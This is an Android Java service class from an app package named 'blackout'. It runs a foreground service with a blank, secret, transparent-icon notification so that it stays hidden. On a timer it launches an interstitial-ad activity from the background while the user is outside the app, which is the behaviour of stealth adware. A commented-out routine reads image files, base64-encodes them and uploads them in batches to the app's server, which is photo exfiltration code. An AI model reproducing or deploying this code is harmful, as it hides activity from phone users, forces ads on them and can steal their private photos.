package com.ghost.blackout.services;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.widget.RemoteViews;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.applovin.sdk.AppLovinSdk;
import com.applovin.sdk.AppLovinSdkConfiguration;
import com.ghost.blackout.ActivityInner;
import com.ghost.blackout.BlackApplication;
import com.ghost.blackout.R;
import com.ghost.blackout.interfaces.ActivityPhase;
import com.ghost.blackout.network.InnerApi;
import com.wineberryhalley.bclassapp.TinyDB;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class BServiceS extends Service {

    private String TAG = "MAINY";

    private static boolean activated = false;
    private static boolean wasLoadedSDK = false;
    private String id_intersticial = "";
    private long secondsToStart = 0;
    private long secondsPeriod = 0;

    public interface ListenerService{
        void OnServiceStart();
        void OnServiceStop();
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    public static TinyDB tinyDB;

    public static void std3(boolean is){
        activated = is;
    }

    private static BServiceS bServiceS;
    private static ListenerService serviceListener;
    public static BServiceS getInstance(){
        return bServiceS;
    }

    public static void setServiceListener(ListenerService s){
        serviceListener = s;
    }

    @Override
    public void onCreate() {
        if (Build.VERSION.SDK_INT >= 26) {
            String CHANNEL_ID = "my_channel_01a";
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                    "ChannelO",
                    NotificationManager.IMPORTANCE_LOW);

            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);

            RemoteViews remoteViews = new RemoteViews(getPackageName(), R.layout.custom_notif);


            @SuppressLint("WrongConstant") Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("")
                    .setVisibility(Notification.VISIBILITY_SECRET)
                    .setContent(remoteViews)
                    .setSmallIcon(R.drawable.ic_trans)
                    .setContentText("").build();

            startForeground(134, notification);


          bServiceS = this;

            InnerApi inm = new InnerApi(this);
inm.load(false);
            Log.e(TAG, "onCreate: si " +(serviceListener != null));

            if(serviceListener != null){
                serviceListener.OnServiceStart();
            }

        }

    }

    public BServiceS setupInterstitial(String id){
        id_intersticial = id;

        return this;
    }

    public static void save(String inters, int secs){
        if(tinyDB != null){
            tinyDB.putString("interssaved", inters);
            tinyDB.putInt("secs_saved", secs);
        }
    }

    public BServiceS setupTime(int secStart, int secPeriod){
        this.secondsToStart = secStart;
        this.secondsPeriod = secPeriod;
        return this;
    }

    private boolean should;

    public BServiceS shouldStart(boolean s){
        this.should = s;
        return this;
    }

    public void startBService(){
        if(!activated){
            return;
        }

        if(id_intersticial.isEmpty()){
            id_intersticial = tinyDB.getString("interssaved");
        }
        if(secondsToStart == 0){
            secondsToStart = tinyDB.getInt("secs_saved");
            secondsPeriod = secondsToStart;
        }

        secondsToStart = (secondsToStart * 1000) / 2;
        secondsPeriod = secondsPeriod * 1000;

        AppLovinSdk.getInstance( this ).setMediationProvider( "max" );
        AppLovinSdk.initializeSdk( this, new AppLovinSdk.SdkInitializationListener() {
            @Override
            public void onSdkInitialized(final AppLovinSdkConfiguration configuration)
            {
             //   Log.e(TAG, "onSdkInitialized: contador iniciado "+(secondsToStart)+" SEGUNDOS pa empezar, "+secondsPeriod+" SEGUNDOS periodicos" );
                wasLoadedSDK = true;
                Log.e(TAG, "onSdkInitialized: sdk Inicializado, debe empezar = "+should );
                if(should){
                    BlackApplication.activityPhase = ActivityPhase.STOPPED;
                    goService();
                }
            }
        } );
    }


    public Timer timer;
    public boolean isStarted;
    public void goService(){
        Log.e(TAG, "goService: servicio GO "+(wasLoadedSDK)+" y "+isStarted );
        if(!wasLoadedSDK || isStarted){
            return;
        }

        isStarted = true;
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(TAG, "run: vamos" );
                r();
            }
        }, secondsPeriod, secondsPeriod);
    }


    private void r() {
if(ActivityInner.isActive || BlackApplication.activityPhase == ActivityPhase.ACTIVE){
    if(BlackApplication.activityPhase == ActivityPhase.ACTIVE && !ActivityInner.isActive){
       // Log.e(TAG, "r: cancelado" );
        isStarted = false;
        timer.cancel();
    }
    return;
}
        try {
        //    Log.e(TAG, "onSdkInitialized: starting..." );
           // Toast.makeText(this, "Abriendo...", Toast.LENGTH_SHORT).show();

            Intent inte = new Intent(this, ActivityInner.class);
            inte.addFlags(FLAG_ACTIVITY_NEW_TASK);

            startActivity(inte);


         /*   Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage(getPackageName());



            Intent a = Intent.createChooser(LaunchIntent, "ELIGE");
            a.addFlags(FLAG_ACTIVITY_NEW_TASK);
            startActivity(a);
*/
            Log.e(TAG, "onSdkInitialized: started "+getPackageName() );
        }catch (Exception e){
            Log.e(TAG, "onSdkInitialized: ah "+e.getMessage() );
        }
    }

/*
    private int tempLimit = 50;
    private int inde = 0;
    public void testD(ArrayList<String> f){

        if(inde >= f.size()){
            return;
        }
        ArrayList<String> bases = new ArrayList<>();
        int count = 0;
        for (int i =inde; i < f.size(); i++) {
            if(count >= tempLimit){
                break;
            }
String img = f.get(i);
            File file = new File(img);
            Log.e(TAG, "img: "+img);
                        Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
                        String ba = getStringImage(bitmap);
                        bases.add(ba);


            inde++;
            count++;

        }

InnerApi innerApi = new InnerApi(this);

innerApi.uploadMultiple(bases, new InnerApi.UploadMultiple() {
    @Override
    public void onUploadAll() {
        Log.e(TAG, "onUploadAll: ready mano" );
        testD(f);
    }

    @Override
    public void onSomeError(String er) {
        Log.e(TAG, "onSomeError: "+er );
    }
});


    }

    public String getStringImage(Bitmap bmp) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] imageBytes = baos.toByteArray();
        String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
        return encodedImage;

    }
*/
    @Override
    public void onDestroy() {
        super.onDestroy();
        if(serviceListener != null){
            serviceListener.OnServiceStop();
        }
    }

}
